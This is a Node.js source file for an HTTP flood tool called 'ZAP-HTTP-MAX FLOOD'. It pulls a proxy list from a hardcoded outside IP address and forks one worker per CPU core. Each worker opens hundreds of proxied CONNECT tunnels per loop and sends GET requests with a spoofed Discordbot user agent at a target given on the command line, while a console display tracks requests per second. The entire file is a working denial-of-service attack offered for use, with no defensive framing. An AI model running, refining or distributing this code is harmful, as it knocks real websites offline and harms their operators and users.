const http = require('http');
const https = require('https');
const { URL } = require('url');
const cluster = require('cluster');
const os = require('os');
const net = require('net');
const tls = require('tls');
const { get } = require('https');

const target = process.argv[2];
const duration = parseInt(process.argv[3]) || 60;
const numCPUs = os.cpus().length;

let totalReq = 0;
let lastReq = 0;
let maxRPS = 0;
let proxyList = [];

if (!target) {
    console.log("Usage: node zap-flood.js <target> <duration>");
    process.exit(1);
}

function fetchProxies(cb) {
    get("https://209.127.114.143/work_proxy.txt", res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            proxyList = data
                .split('\n')
                .map(p => p.trim())
                .filter(p => p.length > 5);
            cb();
        });
    }).on('error', () => {
        console.log("Failed to fetch proxies.");
        process.exit(1);
    });
}

if (cluster.isPrimary) {
    console.clear();
    console.log(`ZAP-HTTP-MAX FLOOD`);
    console.log(`TARGET: ${target}`);
    console.log(`CORES: ${numCPUs}`);
    console.log(`DURATION: ${duration}s`);
    console.log(`Fetching proxies...`);

    fetchProxies(() => {
        console.log(`Loaded ${proxyList.length} proxies.`);

        for (let i = 0; i < numCPUs; i++) cluster.fork();

        setInterval(() => {
            const rps = totalReq - lastReq;
            maxRPS = Math.max(maxRPS, rps);
            lastReq = totalReq;

            console.clear();
            console.log(`ZAP-HTTP-MAX FLOOD`);
            console.log(`Requests Sent:     ${totalReq}`);
            console.log(`Requests/sec:      ${rps}`);
            console.log(`Max Requests/sec:  ${maxRPS}`);
        }, 10000);

        setTimeout(() => {
            console.log("Attack ended.");
            process.exit(0);
        }, duration * 1000);

        cluster.on('message', (worker, msg) => {
            if (msg && msg.reqCount) totalReq += msg.reqCount;
        });
    });

} else {
    const url = new URL(target);
    const isSSL = url.protocol === 'https:';
    const port = url.port || (isSSL ? 443 : 80);
    const path = url.pathname || "/";
    const host = url.hostname;

    const flood = () => {
        let sent = 0;
        for (let i = 0; i < 500; i++) {
            const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
            const [proxyHost, proxyPort] = proxy.split(':');

            const reqData = 
                `GET ${url.href} HTTP/1.1\r\n` +
                `Host: ${host}\r\n` +
                `User-Agent: Discordbot/2.0 (+https://discordapp.com)\r\n` +
                `Accept: */*\r\n` +
                `Connection: close\r\n\r\n`;

            const socket = net.connect(proxyPort, proxyHost, () => {
                socket.write(`CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}\r\n\r\n`);
            });

            socket.setTimeout(5000);
            socket.on('data', chunk => {
                if (chunk.toString().includes("200")) {
                    const tunnel = isSSL
                        ? tls.connect({ socket, servername: host }, () => {
                            tunnel.write(reqData);
                        })
                        : socket;

                    if (!isSSL) tunnel.write(reqData);
                }
            });

            socket.on('error', () => {});
            socket.on('timeout', () => socket.destroy());
            sent++;
        }

        process.send({ reqCount: sent });
        setImmediate(flood);
    };

    flood();
}
